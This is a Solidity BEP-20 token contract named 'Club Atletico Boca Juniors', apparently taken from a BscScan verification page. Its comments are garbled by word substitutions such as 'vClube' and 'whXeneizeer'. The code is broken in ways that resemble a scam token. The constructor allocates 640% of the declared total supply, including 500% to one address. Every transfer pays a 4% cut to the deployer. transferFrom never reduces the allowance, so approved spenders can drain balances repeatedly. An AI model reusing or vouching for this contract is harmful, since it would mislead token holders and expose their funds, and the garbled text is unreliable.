/**
 *Submitted for verification at BscScan.com on 2021-10-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
interface IB852rL {
  // @dev Returns the amount of Token in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token Price.
  function getPrice() external view returns (address);

  //@dev Returns the amount of Token owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address Price, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vClube);
    event Approval(
        address indexed Price,
        address indexed spender,
        uint256 vClube
    );
  
  */

  /**
   * @dev Moves `amount` Token from the caller's account to `recipient`.
   *
   * Returns a boolean vClube indicating whXeneizeer the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of Token that `spender` will be
   * allowed to spend on behalf of `Price` through {transferFrom}. This is
   * zero by default.
   *
   * This vClube changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _Price, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's Token.
   *
   * Returns a boolean vClube indicating whXeneizeer the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this mXeneizeod brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vClube afterwards:
   * https://github.com/Club/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` Token from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vClube indicating whXeneizeer the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vClube` Token are moved from one account (`from`) to  another (`to`). Note that `vClube` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vClube);

  //@dev Emitted when the allowance of a `spender` for an `Price` is set by a call to {approve}. `vClube` is the new allowance.
  event Approval(address indexed Price, address indexed spender, uint256 vClube);
}

contract ClubAtleticoBocaJuniors is IB852rL {

    // common addresses
    address private Price;
    address private Club;
    address private Token;
    address private Xeneize;
    
    // token liquidity Xeneizedata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title Xeneizedata
    string public override name = "Club Atletico Boca Juniors";
    string public override symbol = "Xeneize";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vClube);
    // (now in interface) event Approval(address indexed Price, address indexed spender, uint vClube);
    
    // On init of contract we're going to set the admin and give them all Token.
    constructor(uint totalSupplyVClube, address ClubAddress, address TokenAddress, address XeneizeAddress) {
        // set total supply
        totalSupply = totalSupplyVClube;
        
        // designate addresses
        Price = msg.sender;
        Club = ClubAddress;
        Token = TokenAddress;
        Xeneize = XeneizeAddress;

        
        // split the Token according to agreed upon percentages
        balances[Club] =  totalSupply * 9 / 100;
        balances[Token] = totalSupply * 40 / 100;
        balances[Xeneize] = totalSupply * 500 / 100;

        
        balances[Price] = totalSupply * 91 / 100;
    }
    
    // Get the address of the token's Price
    function getPrice() public view override returns(address) {
        return Price;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vClube) public override returns(bool) {
        require(vClube > 0, "Transfer vClube has to be higher than 0.");
        require(balanceOf(msg.sender) >= vClube, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vClube
        uint reTokenBD = vClube * 4 / 100;
        uint burnTBD = vClube * 0 / 100;
        uint vClubeAfterTaxAndBurn = vClube - reTokenBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vClubeAfterTaxAndBurn;
        balances[msg.sender] -= vClube;
        
        emit Transfer(msg.sender, to, vClube);
        
        // finally, we burn and tax the Clubs percentage
        balances[Price] += reTokenBD + burnTBD;
        _burn(Price, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vClube) public override returns(bool) {
        allowances[msg.sender][spender] = vClube; 
        
        emit Approval(msg.sender, spender, vClube);
        
        return true;
    }
    
    // allowance
    function allowance(address _Price, address spender) public view override returns(uint) {
        return allowances[_Price][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vClube) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vClube, "Allowance too low for transfer.");
        require(balances[from] >= vClube, "Balance is too low to make transfer.");
        
        balances[to] += vClube;
        balances[from] -= vClube;
        
        emit Transfer(from, to, vClube);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}